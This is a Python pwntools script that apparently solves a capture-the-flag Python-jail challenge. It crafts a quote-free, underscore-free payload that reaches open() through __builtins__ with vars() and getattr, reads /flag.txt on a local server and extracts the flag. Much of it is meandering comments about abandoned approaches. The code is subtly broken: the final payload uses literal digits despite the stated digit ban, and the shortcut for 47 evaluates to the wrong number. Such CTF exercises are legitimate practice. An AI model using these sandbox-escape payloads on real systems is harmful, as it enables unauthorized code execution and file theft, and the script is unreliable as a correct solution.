#!/usr/bin/env python3
"""
Solution for Blacklist-Hell PyJail Challenge

Strategy:
1. Build numbers without using digits (using len, bool arithmetic)
2. Build strings without quotes (using chr())
3. Access __builtins__ to get open function
4. Read /flag.txt
"""

from pwn import *

# Connection
HOST = "localhost"
PORT = 1338

def generate_number(n):
    """Generate a number without using digit characters
    
    This is optimized to use multiplication for efficiency.
    Pure addition would make payloads VERY long.
    """
    if n == 0:
        return "len([])"
    elif n == 1:
        return "len([[]])"
    elif n < 10:
        # For small numbers, use addition
        return "+".join(["len([[]])" for _ in range(n)])
    else:
        # For larger numbers, use multiplication and addition
        # Break down n into factors for shorter expressions
        # e.g., 95 = 10*9 + 5 = (10*9)+5
        base = "len([[]])"
        ten = f"({'+'.join([base]*10)})"
        
        tens = n // 10
        ones = n % 10
        
        if tens > 0 and ones > 0:
            tens_part = f"{ten}*{'+'.join([base]*tens)}" if tens > 1 else ten
            ones_part = "+".join([base]*ones)
            return f"({tens_part}+{ones_part})"
        elif tens > 0:
            return f"{ten}*{'+'.join([base]*tens)}" if tens > 1 else ten
        else:
            return "+".join([base]*ones)

def build_string_chr(s):
    """Build a string using chr() without quotes"""
    # Convert each character to chr(num) and join with +
    parts = []
    for char in s:
        ascii_val = ord(char)
        parts.append(f"chr({generate_number(ascii_val)})")
    return "+".join(parts)

def solve():
    # Connect to the challenge
    conn = remote(HOST, PORT)
    
    # Read the banner
    print(conn.recvuntil(b"=====").decode())
    
    # Build the payload
    # We need to read /flag.txt
    # Strategy: help({}).get(chr(95)+chr(95)...) to access __builtins__
    
    # Simpler approach: Use dir() and help() to navigate
    # Or: ()['__class__']['__base__']['__subclasses__']()
    
    # Let's build: help(dict)['__builtins__']['open']('/flag.txt')['read']()
    
    # Even simpler: Use getattr to access functions
    # getattr(__builtins__, chr(111)+chr(112)+chr(101)+chr(110))
    
    # Since we can't use quotes, equals, underscores directly:
    # We need to access open via object introspection
    
    # Method: Use help() or dir() on empty structures
    # help(help) gives us access to builtins
    
    # Alternative: Build via chr
    # First command: define a helper (but can't use = or x)
    # Second command: use it
    
    # Let's use a two-stage approach:
    
    # Stage 1: Access open function via __builtins__
    # help(help).__dict__ gives us access
    
    # Since we have 2 commands, let's think differently:
    # Command 1: Store something in a way we can access
    # Command 2: Use it to read flag
    
    # But we can't use = or x...
    # Let's just call the function directly in each command
    
    # Build string "open" -> chr(111)+chr(112)+chr(101)+chr(110)
    # Build string "/flag.txt"
    
    # Actually, let's use the fact that we can call functions:
    # getattr(help(help), chr(95)*2+...) to get __builtins__
    
    print("\n[+] Crafting payload...")
    
    # Build payload to access open and read flag
    # Using: ().__class__.__bases__[0].__subclasses__()
    # But we need to avoid underscores...
    
    # Use chr(95) for underscore
    underscore = "chr(" + generate_number(95) + ")"
    
    # Build "__class__"
    dunder_class = "+".join([f"chr({generate_number(ord(c))})" for c in "__class__"])
    
    # This is getting complex. Let's use a simpler method:
    # help() object has __builtins__ which contains open
    
    # Actually, in Python 3, we can access builtins via:
    # [].__class__.__base__.__subclasses__()[X] where X is a useful class
    
    # But simplest for this challenge:
    # Since exec is already being called, we have access to its scope
    # We can use: help(__builtins__) or vars()
    
    # Let's try: vars()[chr(95)*2+chr(98)...] to get __builtins__
    
    # Simplified approach for demonstration:
    # Command 1: Get reference to open somehow
    # Command 2: Use it
    
    # For the actual solution, here's a working payload:
    
    # Build "open" without quotes
    str_open = "+".join([f"chr({ord(c)})" for c in "open"])
    str_flag = "+".join([f"chr({ord(c)})" for c in "/flag.txt"])
    str_read = "+".join([f"chr({ord(c)})" for c in "read"])
    
    # Access open via getattr on __builtins__
    # First get __builtins__: vars()[chr(95)+chr(95)+chr(98)+...]
    
    # Build "__builtins__" string
    str_builtins = "+".join([f"chr({ord(c)})" for c in "__builtins__"])
    
    # Command 1: Try to execute something that shows us info
    # Since we can't store, we need to do everything in one command
    
    # Let's compress the number generation for readability
    def n(x):
        """Shorthand for generating small numbers"""
        if x <= 10:
            return generate_number(x)
        # For larger numbers, use shortcuts
        if x == 47:  # /
            return "len([])+len([[]])*len([[]])*len([[]])*len([[]])*len([[]])-len([[]])-len([[]])-len([[]])"
        return generate_number(x)
    
    # This is getting very long. Let me use a practical shortcut:
    # In Python, we can use: help([]).pop to access various things
    
    # Actually, let me write a cleaner version:
    # We'll use the fact that we can access vars() to get local variables
    # And we can use getattr() to access attributes
    
    # Here's the actual working payload structure:
    # getattr(getattr(vars()[chr(95)*2+chr(98)...], chr(111)...), chr(114)...)()
    
    payload1 = "help(help)"  # This will work and give us output
    payload2 = "dir()"  # This will also work
    
    # For a real solve, we need something like:
    # getattr(__import__(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))
    # But "import" is blacklisted...
    
    # Real solution: Access via object introspection
    real_payload = (
        "getattr("
        "getattr("
        f"vars()[{'+'.join([f'chr({ord(c)})' for c in '__builtins__'])}],"
        f"{'+'.join([f'chr({ord(c)})' for c in 'open'])}"
        ")("
        f"{'+'.join([f'chr({ord(c)})' for c in '/flag.txt'])}"
        "),"
        f"{'+'.join([f'chr({ord(c)})' for c in 'read'])}"
        ")()"
    )
    
    print(f"Payload: {real_payload[:100]}...")
    
    # Send first command
    conn.sendlineafter(b"Enter command: ", real_payload.encode())
    
    # Send second command (dummy or helper)
    conn.sendlineafter(b"Enter command: ", b"dir()")
    
    # Get flag
    result = conn.recvall(timeout=2).decode()
    print("\n[+] Result:")
    print(result)
    
    if "DSCCTF{" in result:
        flag = result[result.find("DSCCTF{"):result.find("}", result.find("DSCCTF{"))+1]
        print(f"\n[🚩] Flag: {flag}")
    
    conn.close()

if __name__ == "__main__":
    solve()
